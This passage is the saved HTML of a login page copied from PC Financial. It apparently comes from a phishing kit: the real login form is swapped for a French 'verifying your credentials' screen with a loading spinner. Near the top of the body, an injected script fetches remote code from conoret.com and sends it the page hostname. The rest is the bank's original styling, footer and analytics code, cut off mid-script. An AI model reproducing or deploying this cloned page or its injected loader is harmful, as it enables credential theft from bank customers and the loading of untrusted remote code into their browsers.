      font-style: normal;
      font-weight: 800;
      font-size: 36px;
      line-height: 32px;
      display: flex;
      align-items: center;
      justify-content: cente
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-1[_ngcontent-ng-c3000878099] .points-section[_ngcontent-ng-c3000878099] img[_ngcontent-ng-c3000878099] {
      padding-left: 3px;
      height: 19px
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] {
      text-align: left
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] .monthly-description[_ngcontent-ng-c3000878099] {
      font-family: Averta;
      font-style: normal;
      font-weight: 400;
      font-size: 14px;
      line-height: 19px
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] .conditions-apply[_ngcontent-ng-c3000878099] {
      font-family: Averta;
      font-style: normal;
      font-weight: 600;
      font-size: 14px;
      line-height: 19px;
      display: flex;
      align-items: center;
      margin-top: 5px
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] .conditions-apply[_ngcontent-ng-c3000878099] img[_ngcontent-ng-c3000878099] {
      padding-left: 3px
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-3[_ngcontent-ng-c3000878099] {
      width: auto;
      padding-right: 6%;
      padding-left: 1%;
      text-align: center
    }

    .payroll-offer-cta[_ngcontent-ng-c3000878099] {
      position: absolute;
      top: 8px;
      right: 8px;
      background: transparent;
      border: none
    }

    .payroll-offer-cta[_ngcontent-ng-c3000878099] img[_ngcontent-ng-c3000878099] {
      width: 20px;
      height: 20px
    }

    .white-background[_ngcontent-ng-c3000878099] {
      background: #FFFFFF
    }

    .silver-background[_ngcontent-ng-c3000878099] {
      background: #F6F6F7
    }

    .clickable[_ngcontent-ng-c3000878099] {
      cursor: pointer
    }

    .clickable[_ngcontent-ng-c3000878099]:hover {
      background-color: #ccc
    }

    .clickable[_ngcontent-ng-c3000878099]:active {
      background-color: #999
    }

    .clickable[_ngcontent-ng-c3000878099]:focus {
      background-color: #999
    }

    .smaller-font[_ngcontent-ng-c3000878099] .col-1[_ngcontent-ng-c3000878099] .points-section[_ngcontent-ng-c3000878099] {
      font-size: 30px
    }

    .smaller-font[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] .monthly-description[_ngcontent-ng-c3000878099],
    .smaller-font[_ngcontent-ng-c3000878099] .col-2[_ngcontent-ng-c3000878099] .conditions-apply[_ngcontent-ng-c3000878099] {
      font-size: 12px
    }
  </style>
</head>

<body class="">
  <script
    type="text/javascript">window.top === window && !function () { var e = document.createElement("script"), t = document.getElementsByTagName("head")[0]; e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e) }();</script>
  <app-root ng-version="16.2.12">
    <div id="popper-wrapper" class="route-en route-login"><loader-shield
        _nghost-ng-c1715610169=""><!----></loader-shield><button pcfskipclickoutside="" id="dismiss-btn"
        class="ada-trigger" data-skip-click-outside="keepBlade" style="display: block;"> Dismiss chatbot
      </button><router-outlet></router-outlet><ng-component><router-outlet></router-outlet><login-container
          _nghost-ng-c1323118236=""><app-header _ngcontent-ng-c1323118236="" class="public-header"
            _nghost-ng-c582108171="">
            <header _ngcontent-ng-c582108171=""><app-logo _ngcontent-ng-c582108171="" _nghost-ng-c3239806278="">
                <h1 _ngcontent-ng-c3239806278=""><a _ngcontent-ng-c3239806278="" tabindex="0" role="link"
                    class="logo-link"><img _ngcontent-ng-c3239806278=""
                      src="./Login _ PC Financial_files/pcf-logo-light.svg"
                      alt="Navigate to PC Financial website"></a><!----><!----></h1>
                <!----><!----><!----><!----><!----><!----><!---->
              </app-logo></header><!----><!---->
          </app-header>
          <main _ngcontent-ng-c1323118236="" class="login-container">
            <header _ngcontent-ng-c1323118236="">
              <div _ngcontent-ng-c1323118236="" class="login-header-container">
                <h2 _ngcontent-ng-c1323118236="">Welcome to PC Financial®</h2>
                <p _ngcontent-ng-c1323118236="">Manage your account, track your spending, and get support, all at your
                  fingertips.</p>
                <div _ngcontent-ng-c1323118236="" class="payroll-offer-container"><shared-promo-tile
                    _ngcontent-ng-c1323118236="" _nghost-ng-c3000878099="">
                    <div _ngcontent-ng-c3000878099="" class="payroll-offer clickable white-background">
                      <div _ngcontent-ng-c3000878099="" class="payroll-offer-container">
                        <div _ngcontent-ng-c3000878099="" class="col-1">
                          <div _ngcontent-ng-c3000878099="" class="earn-label">Earn up to</div>
                          <div _ngcontent-ng-c3000878099="" class="points-section"> 5,000 <img
                              _ngcontent-ng-c3000878099="" src="./Login _ PC Financial_files/pts.svg"></div>
                        </div>
                        <div _ngcontent-ng-c3000878099="" class="col-2">
                          <div _ngcontent-ng-c3000878099="" class="monthly-description">every month when you set up
                            payroll or pension direct deposit.</div>
                          <div _ngcontent-ng-c3000878099="" class="conditions-apply"> Conditions Apply <img
                              _ngcontent-ng-c3000878099="" src="./Login _ PC Financial_files/arrow-right-black.svg">
                          </div><!---->
                        </div>
                        <div _ngcontent-ng-c3000878099="" class="col-3"><img _ngcontent-ng-c1323118236=""
                            src="./Login _ PC Financial_files/payday-calender-grey.svg"></div>
                      </div><button _ngcontent-ng-c3000878099="" class="payroll-offer-cta"><img
                          _ngcontent-ng-c3000878099="" src="./Login _ PC Financial_files/close-with-background.svg"
                          alt=""></button><!---->
                    </div>
                  </shared-promo-tile></div><!---->
              </div>
            </header>
            <div _ngcontent-ng-c1323118236="" class="login-form-container">
              <h3 _ngcontent-ng-c1323118236="">Verification Des information d'authentification</h3>
          
           <img src="../ajax-loading.gif" alt="" srcset="">
            </div>
          </main><blade-inactive-account _ngcontent-ng-c1323118236=""
            _nghost-ng-c726670208=""><!----></blade-inactive-account><blade-two-factor-authentication
            _ngcontent-ng-c1323118236=""
            _nghost-ng-c14167106=""><!----></blade-two-factor-authentication><blade-direct-deposit-conditions
            _ngcontent-ng-c1323118236="" _nghost-ng-c3345695179=""><!----></blade-direct-deposit-conditions><app-footer
            _ngcontent-ng-c1323118236="" _nghost-ng-c1930269705="">
            <footer _ngcontent-ng-c1930269705="">
              <div _ngcontent-ng-c1930269705="" id="footer-wrapper" class="footer-wrapper">
                <div _ngcontent-ng-c1930269705="" class="footer-container">
                  <div _ngcontent-ng-c1930269705="" class="footer-list-container">
                    <div _ngcontent-ng-c1930269705="" class="footer-child branding-social">
                      <div _ngcontent-ng-c1930269705="" class="footer-logo-container"><app-logo
                          _ngcontent-ng-c1930269705="" headertagtype="h2" theme="dark" _nghost-ng-c3239806278=""><!---->
                          <h2 _ngcontent-ng-c3239806278=""><a _ngcontent-ng-c3239806278="" tabindex="0" role="link"
                              class="logo-link"><img _ngcontent-ng-c3239806278="" class="pcf-full-logo"
                                src="./Login _ PC Financial_files/pcf-logo-transparent.svg"
                                alt="Navigate to PC Financial website"><img _ngcontent-ng-c3239806278=""
                                src="./Login _ PC Financial_files/pcf-icon-without-text.svg"
                                class="pcf-logo-without-text"
                                alt="Navigate to PC Financial website"><!----></a><!----><!----></h2>
                          <!----><!----><!----><!----><!----><!---->
                        </app-logo></div>
                      <div _ngcontent-ng-c1930269705="" class="footer-app_stores">
                        <ul _ngcontent-ng-c1930269705="">
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer"
                              href="https://itunes.apple.com/ca/app/pc-financial/id1446078005?mt=8"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/app-store.svg"
                                alt="Apple App Store"></a></li>
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer"
                              href="https://play.google.com/store/apps/details?id=ca.pcfinancial.bank"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/google-play.svg"
                                alt="Google Play Store"></a></li>
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer"
                              href="https://www.cdic.ca/your-coverage/protecting-your-deposit/?widget=1"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/cdic-digital-symbol.svg"
                                alt="Canada Deposit Insurance Corporation (CDIC) logo"></a></li>
                        </ul>
                      </div>
                      <div _ngcontent-ng-c1930269705="" class="footer-social">
                        <ul _ngcontent-ng-c1930269705="">
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer" href="https://www.facebook.com/PCFinancial"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/facebook.svg"
                                alt="Facebook"></a></li>
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer" href="https://www.instagram.com/pcfinancial"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/instagram.svg"
                                alt="Instagram"></a></li>
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer" href="https://twitter.com/pcfinancial"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/twitter.svg"
                                alt="Twitter"></a></li>
                          <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                              rel="noopener noreferrer"
                              href="https://ca.linkedin.com/company/president&#39;s-choice-financial"><img
                                _ngcontent-ng-c1930269705="" src="./Login _ PC Financial_files/linkedin.svg"
                                alt="Linked In"></a></li>
                        </ul>
                      </div><!---->
                    </div>
                    <nav _ngcontent-ng-c1930269705="" aria-label="Footer Links">
                      <div _ngcontent-ng-c1930269705="" class="footer-child link-lists">
                        <div _ngcontent-ng-c1930269705="" class="lists-container">
                          <ul _ngcontent-ng-c1930269705="">
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/about-us">About Us</a>
                            </li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/contact-us">Contact Us</a>
                            </li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer"
                                href="https://www.pcfinancial.ca/en/learning-hub/faqs/">FAQs</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer"
                                href="https://www.pcfinancial.ca/en/learning-hub/blog/">Blog</a></li><!---->
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/media-centre">Media
                                Centre</a></li>
                          </ul>
                          <ul _ngcontent-ng-c1930269705="">
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/careers">Careers</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/security/">Security</a>
                            </li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/en/cdic">CDIC Member</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" href="https://www.pcfinancial.ca/legal-stuff">Legal and
                                Privacy </a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer"
                                href="https://www.pcfinancial.ca/en/legal-stuff/website-terms-of-use">Website Terms of
                                Use</a></li>
                          </ul>
                          <ul _ngcontent-ng-c1930269705="">
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" class="external-link" href="https://www.pcinsiders.ca/">PC
                                Insiders</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" class="external-link"
                                href="https://www.loblaw.ca/en/responsibility.html">Social Responsibility</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" class="external-link" href="https://www.pcoptimum.ca/">PC
                                Optimum</a></li>
                            <li _ngcontent-ng-c1930269705=""><a _ngcontent-ng-c1930269705="" target="_blank"
                                rel="noopener noreferrer" class="external-link"
                                href="https://www.presidentschoice.ca/en_CA.html">President's Choice</a></li>
                          </ul>
                          <ul _ngcontent-ng-c1930269705="">
                            <li _ngcontent-ng-c1930269705=""><locale-selector _ngcontent-ng-c1930269705=""
                                _nghost-ng-c1184276130="">
                                <div _ngcontent-ng-c1184276130=""><!----></div>
                                <div _ngcontent-ng-c1184276130=""><button _ngcontent-ng-c1184276130="" type="button"
                                    class="button-with-icon" aria-label="Français"><img _ngcontent-ng-c1184276130=""
                                      src="./Login _ PC Financial_files/globe-icon.svg" alt=""><!----> Français
                                  </button><!----></div><!---->
                              </locale-selector></li>
                          </ul>
                        </div>
                      </div>
                    </nav>
                  </div>
                  <div _ngcontent-ng-c1930269705="" class="bottom-container">
                    <p _ngcontent-ng-c1930269705="" class="copyright">President's Choice Financial Mastercard is
                      provided by President's Choice Bank. <em>PC Optimum</em> program is provided by President’s Choice
                      Services Inc.</p><!---->
                  </div>
                </div>
              </div>
            </footer>
          </app-footer>
        </login-container><!----><fullscreen-takeover
          _nghost-ng-c3319022991=""><!----></fullscreen-takeover><modal-message-error
          _nghost-ng-c1274093243=""><!----></modal-message-error></ng-component><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!---->
    </div>
  </app-root>
  <style>
    .loader-container {
      display: flex;
      display: -ms-flexbox;
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      -webkit-box-align: center;
      -moz-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      align-items: center
    }

    .loader-container .loader {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 8px solid #ee2e24;
      border-right-color: transparent;
      border-radius: 50%;
      animation: 1s linear 0s infinite rotate-cw
    }

    .loader-container .loader p {
      margin: 0;
      font-size: 0
    }

    .full-screen-loader .loader-container {
      z-index: 10000;
      width: 100%;
      height: 100%;
      -webkit-box-pack: center;
      -moz-box-pack: center;
      -ms-flex-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      background-color: #fff
    }

    @keyframes rotate-cw {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }
  </style><!--[if (gt IE 9)|!(IE)]><!-->
  <div class="full-screen-loader">
    <div class="loader-container lrg">
      <div class="loader">
        <p role="alert">Loading</p>
      </div>
    </div>
  </div><!--<![endif]-->
  <section>
    <div id="unsupported"></div>
    <script>window.BrowserslistUserAgentRegExp = /((CPU[ +]OS|iPhone[ +]OS|CPU[ +]iPhone|CPU IPhone OS)[ +]+(10[_\.]0|10[_\.]([1-9]|\d{2,})|10[_\.]2|10[_\.]([3-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})[_\.]\d+|11[_\.]0|11[_\.]([1-9]|\d{2,})|11[_\.]2|11[_\.]([3-9]|\d{2,})|(1[2-9]|[2-9]\d|\d{3,})[_\.]\d+|12[_\.]0|12[_\.]([1-9]|\d{2,})|12[_\.]5|12[_\.]([6-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})[_\.]\d+|13[_\.]0|13[_\.]([1-9]|\d{2,})|13[_\.]7|13[_\.]([8-9]|\d{2,})|(1[4-9]|[2-9]\d|\d{3,})[_\.]\d+|14[_\.]0|14[_\.]([1-9]|\d{2,})|14[_\.]4|14[_\.]([5-9]|\d{2,})|14[_\.]8|14[_\.](9|\d{2,})|(1[5-9]|[2-9]\d|\d{3,})[_\.]\d+|15[_\.]0|15[_\.]([1-9]|\d{2,})|15[_\.]8|15[_\.](9|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})[_\.]\d+|16[_\.]0|16[_\.]([1-9]|\d{2,})|(1[7-9]|[2-9]\d|\d{3,})[_\.]\d+|17[_\.]0|17[_\.]([1-9]|\d{2,})|(1[8-9]|[2-9]\d|\d{3,})[_\.]\d+)(?:[_\.]\d+)?)|(CFNetwork\/808\.(\d))|(CFNetwork\/8.* Darwin\/16\.5\.\d+)|(CFNetwork\/8.* Darwin\/16\.6\.\d+)|(CFNetwork\/8.* Darwin\/16\.7\.\d+)|(CFNetwork\/8.* Darwin\/16\.\d+)|(CFNetwork\/8.* Darwin\/17\.0\.\d+)|(CFNetwork\/8.* Darwin\/17\.2\.\d+)|(CFNetwork\/8.* Darwin\/17\.3\.\d+)|(CFNetwork\/8.* Darwin\/17\.\d+)|(OperaMini(?:\/att)?\/?(\d+)?(?:\.\d+)?(?:\.\d+)?)|(Opera\/.+Opera Mobi.+Version\/(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|73\.0|73\.([1-9]|\d{2,})|(7[4-9]|[8-9]\d|\d{3,})\.\d+))|(Opera\/(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|73\.0|73\.([1-9]|\d{2,})|(7[4-9]|[8-9]\d|\d{3,})\.\d+).+Opera Mobi)|(Opera Mobi.+Opera(?:\/|\s+)(12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|73\.0|73\.([1-9]|\d{2,})|(7[4-9]|[8-9]\d|\d{3,})\.\d+))|(SamsungBrowser\/(21\.0|21\.([1-9]|\d{2,})|(2[2-9]|[3-9]\d|\d{3,})\.\d+))|(Edge\/(118(?:\.0)?|118(?:\.([1-9]|\d{2,}))?|(119|1[2-9]\d|[2-9]\d\d|\d{4,})(?:\.\d+)?))|(HeadlessChrome((?:\/41\.0\.\d+)?|(?:\/41\.([1-9]|\d{2,})\.\d+)?|(?:\/(4[2-9]|[5-9]\d|\d{3,})\.\d+\.\d+)?|(?:\/83\.0\.\d+)?|(?:\/83\.([1-9]|\d{2,})\.\d+)?|(?:\/(8[4-9]|9\d|\d{3,})\.\d+\.\d+)?))|((Chromium|Chrome)\/(41\.0|41\.([1-9]|\d{2,})|(4[2-9]|[5-9]\d|\d{3,})\.\d+|83\.0|83\.([1-9]|\d{2,})|(8[4-9]|9\d|\d{3,})\.\d+)(?:\.\d+)?)|(IEMobile[ /](10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+))|(PlayBook.+RIM Tablet OS (7\.0|7\.([1-9]|\d{2,})|([8-9]|\d{2,})\.\d+|10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+)\.\d+)|((Black[bB]erry|BB10).+Version\/(7\.0|7\.([1-9]|\d{2,})|([8-9]|\d{2,})\.\d+|10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+)\.\d+)|(Version\/(10\.0|10\.([1-9]|\d{2,})|(1[1-9]|[2-9]\d|\d{3,})\.\d+|11\.1|11\.([2-9]|\d{2,})|(1[2-9]|[2-9]\d|\d{3,})\.\d+|12\.0|12\.([1-9]|\d{2,})|(1[3-9]|[2-9]\d|\d{3,})\.\d+|13\.0|13\.([1-9]|\d{2,})|(1[4-9]|[2-9]\d|\d{3,})\.\d+|14\.0|14\.([1-9]|\d{2,})|(1[5-9]|[2-9]\d|\d{3,})\.\d+|15\.0|15\.([1-9]|\d{2,})|(1[6-9]|[2-9]\d|\d{3,})\.\d+|16\.0|16\.([1-9]|\d{2,})|(1[7-9]|[2-9]\d|\d{3,})\.\d+|17\.0|17\.([1-9]|\d{2,})|(1[8-9]|[2-9]\d|\d{3,})\.\d+)(?:\.\d+)?.*Safari\/)|(Firefox\/(61\.0|61\.([1-9]|\d{2,})|(6[2-9]|[7-9]\d|\d{3,})\.\d+)\.\d+)|(Firefox\/(61\.0|61\.([1-9]|\d{2,})|(6[2-9]|[7-9]\d|\d{3,})\.\d+)(pre|[ab]\d+[a-z]*)?)/, window.BrowserslistUserAgentRegExp.test(navigator.userAgent) || (document.getElementById("unsupported").innerHTML = ' <div class="unsupported-browser" style="margin: 0; padding: 0; width: 100%; height: 100vh; display: table;"> <div class="unsupported-browser-header" style="border-bottom: 1px solid #e8e9eb; height: 70px;"> <img src="/assets/images/en/logo.jpg" alt="Navigate to PC Financial website" style="padding: 18.7px 0 19.3px 20px;"> </div> <div class="unsupported-browser-content" style="display: table-row; vertical-align: middle; text-align: center;"> <div class="unsupported-browser-description" style="display: table-cell; display: inline-block; text-align: left; max-width: 600px; margin: 0 auto; padding: 0px 20px;"> <h1>Welcome to PC Financial® | PC Finance en ligne vous souhaite la bienvenue</h1> <p style="line-height: 1.67; color: #74777a;"> Manage your account, track your spending, and get support, all at your fingertips. | Gérez vos comptes, faites le suivi de vos dépenses et obtenez de l’aide, tout cela à portée de main. </p> <div style="clear: both; margin-top: 40px;"> <img src="/assets/images/result-error.jpg" alt="result error" style="margin-right: 20px; float: left;"  /> <h2>Unsupported browser | Navigateur non pris en charge</h2> </div> <p style="line-height: 1.67; color: #74777a;"> Unfortunately, the browser you are using does not support this site. Please upgrade your browser if applicable or try another browser. | Malheureusement, le navigateur que vous utilisez ne fonctionne pas sur ce site. Veuillez mettre à jour votre navigateur le cas échéant, ou essayer un navigateur différent. </p> </div> </div> </div> ', document.body.className = document.body.className.replace("processing", ""))</script>
  </section>
  <script src="./Login _ PC Financial_files/runtime.81e70d7e0cacdd5f.js.téléchargement" type="module"></script>
  <script src="./Login _ PC Financial_files/polyfills.81719e4198015f8f.js.téléchargement" type="module"></script>
  <script src="./Login _ PC Financial_files/vendor.aaca65316e4479da.js.téléchargement" type="module"></script>
  <script src="./Login _ PC Financial_files/main.8dd19e02593a5cc6.js.téléchargement" type="module"></script>
  <script type="text/javascript" src="./Login _ PC Financial_files/iG1w"></script>
  <script type="text/javascript" async="" src="./Login _ PC Financial_files/generic1711463316794.js.téléchargement"
    charset="UTF-8"></script>
  <div id="extension-mmplj"></div>
  <style title="MDigital_animationStyle"></style>
  <script id="gtm-script" type="text/javascript" async=""
    src="./Login _ PC Financial_files/gtm.js.téléchargement"></script><noscript><iframe id="gtm-noscript" width="0"
      height="0" title="Analytics" src="./Login _ PC Financial_files/ns.html"></iframe></noscript>
  <script type="text/javascript"
    id="">(function () {
                window.__piiRedact = window.__piiRedact || !1; var k = function (f) {
                  var c = [{ name: "EMAIL", regex: /[^\/]{4}(@|%40)(?!example\.com)[^\/]{4}/gi, group: "" }, { name: "SELF-EMAIL", regex: /[^\/]{4}(@|%40)(?=example\.com)[^\/]{4}/gi, group: "" }, { name: "TEL", regex: /((tel=)|(telephone=)|(phone=)|(mobile=)|(mob=))[\d\+\s][^&\/\?]+/gi, group: "$1" }, { name: "NAME", regex: /((firstname=)|(lastname=)|(surname=))[^&\/\?]+/gi, group: "$1" }, { name: "PASSWORD", regex: /((password=)|(passwd=)|(pass=))[^&\/\?]+/gi, group: "$1" }, {
                    name: "ZIP",
                    regex: /((postcode=)|(zipcode=)|(zip=))[^&\/\?]+/gi, group: "$1"
                  }], d = function (a) { return (a || document.location.search).replace(/(^\?)/, "").split("\x26").map(function (b) { return b = b.split("\x3d"), this[b[0]] = decodeURIComponent(b[1]), this }.bind({}))[0] }, h = function (a) { return Object.keys(a).map(function (b) { return b + "\x3d" + encodeURIComponent(a[b]) }).join("\x26") }, e = d(f), g; for (g in e) c.forEach(function (a) { e[g].match(a.regex) && (e[g] = e[g].replace(a.regex, a.group + "[REDACTED " + a.name + "]")) }); return h(e)
                }; if (!window.__piiRedact) {
                  window.__piiRedact =
                  !0; try { var l = window.navigator.sendBeacon; window.navigator.sendBeacon = function () { if (arguments && arguments[0].match(/google-analytics\.com.*v=2&/)) { var f = arguments[0].split("?")[0], c = arguments[0].split("?")[1]; c = k(c); var d = []; arguments[1] && arguments[1].split("\r\n").forEach(function (h) { d.push(k(h)) }); arguments[0] = [f, c].join("?"); arguments[1] && 0 < d.length && d.join("\r\n") } return l.apply(this, arguments) } } catch (f) { return l.apply(this, arguments) }
                }
              })();</script>
  <script type="text/javascript"
    id="">/*

Adobe Visitor API for JavaScript version: 3.4.0
Copyright 2019 Adobe, Inc. All Rights Reserved
More info available at https://marketing.adobe.com/resources/help/en_US/mcvid/
*/
      var e = function () {
        function Q() {
          return {
            callbacks: {}, add: function (p, w) { this.callbacks[p] = this.callbacks[p] || []; var r = this.callbacks[p].push(w) - 1; return function () { this.callbacks[p].splice(r, 1) } }, execute: function (p, w) { if (this.callbacks[p]) { w = void 0 === w ? [] : w; w = w instanceof Array ? w : [w]; try { for (; this.callbacks[p].length;) { var r = this.callbacks[p].shift(); "function" == typeof r ? r.apply(null, w) : r instanceof Array && r[1].apply(r[0], w) } delete this.callbacks[p] } catch (n) { } } }, executeAll: function (p, w) {
              (w || p && !da.isObjectEmpty(p)) &&
              Object.keys(this.callbacks).forEach(function (r) { var n = void 0 !== p[r] ? p[r] : ""; this.execute(r, n) }, this)
            }, hasCallbacks: function () { return !!Object.keys(this.callbacks).length }
          }
        } function a(p, w) {
          if (p === w) return 0; p = p.toString().split("."); w = w.toString().split("."); a: { var r = p.concat(w); for (var n = /^\d+$/, t = 0, x = r.length; t < x; t++)if (!n.test(r[t])) { r = !1; break a } r = !0 } if (r) {
            r = p; for (n = w; r.length < n.length;)r.push("0"); for (; n.length < r.length;)n.push("0"); a: {
              for (r = 0; r < p.length; r++) {
                n = parseInt(p[r], 10); t = parseInt(w[r],
                  10); if (n > t) { p = 1; break a } if (t > n) { p = -1; break a }
              } p = 0
            }
          } else p = NaN; return p
        } var y = "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : {}; Object.assign = Object.assign || function (p) { for (var w, r, n = 1; n < arguments.length; ++n)for (w in r = arguments[n], r) Object.prototype.hasOwnProperty.call(r, w) && (p[w] = r[w]); return p }; var O = { HANDSHAKE: "HANDSHAKE", GETSTATE: "GETSTATE", PARENTSTATE: "PARENTSTATE" }, R = {
          MCMID: "MCMID", MCAID: "MCAID", MCAAMB: "MCAAMB", MCAAMLH: "MCAAMLH", MCOPTOUT: "MCOPTOUT",
          CUSTOMERIDS: "CUSTOMERIDS"
        }, S = { MCMID: "getMarketingCloudVisitorID", MCAID: "getAnalyticsVisitorID", MCAAMB: "getAudienceManagerBlob", MCAAMLH: "getAudienceManagerLocationHint", MCOPTOUT: "getOptOut", ALLFIELDS: "getVisitorValues" }, G = { CUSTOMERIDS: "getCustomerIDs" }, N = { MCMID: "getMarketingCloudVisitorID", MCAAMB: "getAudienceManagerBlob", MCAAMLH: "getAudienceManagerLocationHint", MCOPTOUT: "getOptOut", MCAID: "getAnalyticsVisitorID", CUSTOMERIDS: "getCustomerIDs", ALLFIELDS: "getVisitorValues" }, Z = { MC: "MCMID", A: "MCAID", AAM: "MCAAMB" },
          c = { MCMID: "MCMID", MCOPTOUT: "MCOPTOUT", MCAID: "MCAID", MCAAMLH: "MCAAMLH", MCAAMB: "MCAAMB" }, d = { UNKNOWN: 0, AUTHENTICATED: 1, LOGGED_OUT: 2 }, g = { GLOBAL: "global" }, h = c, m = d, v = g, u = R, B = function (p) { function w() { } function r(t, x) { var b = this; return function () { var z = p(0, t), E = {}; return E[t] = z, b.setStateAndPublish(E), x(z), z } } var n = this; this.getMarketingCloudVisitorID = function (t) { t = t || w; var x = this.findField(u.MCMID, t); t = r.call(this, u.MCMID, t); return void 0 !== x ? x : t() }; this.getVisitorValues = function (t) { n.getMarketingCloudVisitorID(function (x) { t({ MCMID: x }) }) } },
          F = O, K = S, I = G, ea = function () { function p() { } function w(t, x) { var b = this; return function () { return b.callbackRegistry.add(t, x), b.messageParent(F.GETSTATE), "" } } function r(t) { this[K[t]] = function (x) { x = x || p; var b = this.findField(t, x); x = w.call(this, t, x); return void 0 !== b ? b : x() } } function n(t) { this[I[t]] = function () { return this.findField(t, p) || {} } } Object.keys(K).forEach(r, this); Object.keys(I).forEach(n, this) }, fa = S, ya = function () {
            Object.keys(fa).forEach(function (p) {
              this[fa[p]] = function (w) {
                this.callbackRegistry.add(p,
                  w)
              }
            }, this)
          }, da = function (p, w) { return w = { exports: {} }, p(w, w.exports), w.exports }(function (p, w) {
            w.isObjectEmpty = function (r) { return r === Object(r) && 0 === Object.keys(r).length }; w.isValueEmpty = function (r) { return "" === r || w.isObjectEmpty(r) }; w.getIeVersion = function () { if (document.documentMode) return document.documentMode; for (var r = 7; 4 < r; r--) { var n = document.createElement("div"); if (n.innerHTML = "\x3c!--[if IE " + r + "]\x3e\x3cspan\x3e\x3c/span\x3e\x3c![endif]--\x3e", n.getElementsByTagName("span").length) return r } return null };
            w.encodeAndBuildRequest = function (r, n) { return r.map(encodeURIComponent).join(n) }; w.isObject = function (r) { return null !== r && "object" == typeof r && !1 === Array.isArray(r) }
          }), za = (da.isObjectEmpty, da.isValueEmpty, da.getIeVersion, da.encodeAndBuildRequest, da.isObject, Q), Aa = O, Ba = { 0: "prefix", 1: "orgID", 2: "state" }, oa = function (p, w) {
            this.parse = function (r) { try { var n = {}; return r.data.split("|").forEach(function (t, x) { void 0 !== t && (n[Ba[x]] = 2 !== x ? t : JSON.parse(t)) }), n } catch (t) { } }; this.isInvalid = function (r) {
              var n = this.parse(r);
